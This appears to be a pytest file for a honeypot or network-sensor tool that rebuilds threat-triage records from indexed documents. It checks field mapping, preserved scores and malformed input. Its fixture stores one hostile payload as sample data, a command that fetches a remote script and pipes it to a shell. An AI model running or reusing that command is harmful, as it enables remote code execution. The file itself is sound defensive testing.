"""Rebuilding records from indexed documents."""

from __future__ import annotations

from deception_shield.es_client import document_to_record
from deception_shield.models import TriageBand


def indexed_document(**overrides) -> dict:
    document = {
        "@timestamp": "2026-09-20T12:00:00Z",
        "source": {"ip": "203.0.113.5", "port": 44444},
        "destination": {"ip": "10.90.0.5", "port": 80},
        "network": {"transport": "tcp", "protocol": "HTTP"},
        "observer": {"name": "sensor-0"},
        "payload_hex": b"wget http://x/m.sh | sh".hex(),
        "threat": {
            "payload_score": 70,
            "payload_signatures": ["remote_payload_fetch", "shell_pipe_execution"],
            "triage": "likely-malicious",
        },
    }
    document.update(overrides)
    return document


class TestDocumentToRecord:
    def test_round_trips_the_core_fields(self) -> None:
        record = document_to_record(indexed_document())
        assert record is not None
        assert record.source_ip == "203.0.113.5"
        assert record.destination_port == 80
        assert record.payload == b"wget http://x/m.sh | sh"
        assert record.sensor_id == "sensor-0"

    def test_preserves_the_stored_verdict(self) -> None:
        """Scoring happened at ingest; re-deriving it here would risk drift."""
        record = document_to_record(indexed_document())
        assert record is not None
        assert record.score == 70
        assert record.triage is TriageBand.LIKELY_MALICIOUS

    def test_derives_the_band_when_absent(self) -> None:
        document = indexed_document(threat={"payload_score": 85})
        record = document_to_record(document)
        assert record is not None and record.triage is TriageBand.CRITICAL

    def test_falls_back_to_ascii_payload(self) -> None:
        document = indexed_document()
        del document["payload_hex"]
        document["payload_ascii"] = "GET /"
        record = document_to_record(document)
        assert record is not None and record.payload == b"GET /"

    def test_accepts_frame_time_when_timestamp_missing(self) -> None:
        document = indexed_document()
        del document["@timestamp"]
        document["frame_time"] = "2026-09-20T12:00:00+00:00"
        assert document_to_record(document) is not None

    def test_malformed_documents_return_none(self) -> None:
        """One bad document must not abort an analysis run."""
        assert document_to_record({}) is None
        assert document_to_record({"@timestamp": "not-a-date"}) is None
        assert document_to_record({"@timestamp": "2026-09-20T12:00:00Z", "source": {"port": "abc"}}) is None

    def test_missing_optional_fields_are_tolerated(self) -> None:
        record = document_to_record(
            {"@timestamp": "2026-09-20T12:00:00Z", "payload_ascii": "x"}
        )
        assert record is not None
        assert record.score == 0
        assert record.signatures == []
